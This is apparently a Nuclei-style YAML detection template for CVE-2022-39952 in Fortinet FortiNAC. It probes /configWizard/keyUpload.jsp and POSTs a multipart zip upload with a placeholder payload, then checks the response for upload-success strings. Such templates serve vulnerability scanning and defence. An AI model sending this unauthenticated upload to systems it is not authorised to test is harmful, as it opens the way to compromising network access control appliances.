id: yaml-poc-fortinet-fortinac-other-CVE-2022-39952
info:
  name: Yaml Poc Fortinet Fortinac Other Cve 2022 39952
  author: zhixiong.chen
  severity: critical
  description: 'Converted from xpoc: yaml-poc-fortinet-fortinac-other-CVE-2022-39952'
  tags: fortinet,cve
  classification:
    cve-id: CVE-2022-39952
  reference:
  - https://fortiguard.com/psirt/FG-IR-22-300
  - https://www.horizon3.ai/fortinet-fortinac-cve-2022-39952-deep-dive-and-iocs/
http:
- method: GET
  path:
  - /configWizard/keyUpload.jsp
  redirects: false
- method: POST
  path:
  - /configWizard/keyUpload.jsp
  body: "--{{boundary}}\r\nContent-Disposition: form-data; name=\"key\"; filename=\"\
    {{filename}}.zip\"\r\n\r\n{{payload}}\r\n--{{boundary}}--\r\n"
  headers:
    Content-Type: multipart/form-data; boundary={{boundary}}
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - SuccessfulUpload
    - zipUploadSuccess
